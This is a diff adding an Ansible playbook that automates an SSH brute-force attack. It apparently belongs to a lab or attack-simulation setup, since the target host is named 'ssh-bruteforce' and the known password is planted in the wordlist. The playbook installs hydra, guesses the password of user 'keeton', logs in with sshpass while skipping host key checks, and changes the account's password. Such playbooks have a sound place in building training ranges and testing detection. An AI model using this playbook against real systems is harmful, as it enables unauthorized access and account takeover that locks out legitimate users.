@@ -1,0 +1,15 @@
+- name: Bruteforce SSH Password
+  hosts: attackers
+  tasks:
+#    - name: Print all available facts
+#      ansible.builtin.debug:
+#        var: hostvars
+
+    - name: BruteForce SSH
+      ansible.builtin.shell: |
+              apt-get update; apt-get install -y  hydra-gtk
+              echo "Qm8Aokcvl9NHzO1XJRs1KYhTkTq0SmZf" >> passwords.txt
+              hydra -l keeton -P passwords.txt "{{ hostvars['ssh-bruteforce']['ansible_host'] }}" ssh -t 4
+              apt install sshpass
+              echo "echo \"keeton:mynewpassword!!!\" | chpasswd" | sshpass -p Qm8Aokcvl9NHzO1XJRs1KYhTkTq0SmZf ssh  -o "StrictHostKeyChecking=no" keeton@"{{ hostvars['ssh-bruteforce']['ansible_host'] }}"
+      ignore_errors: yes
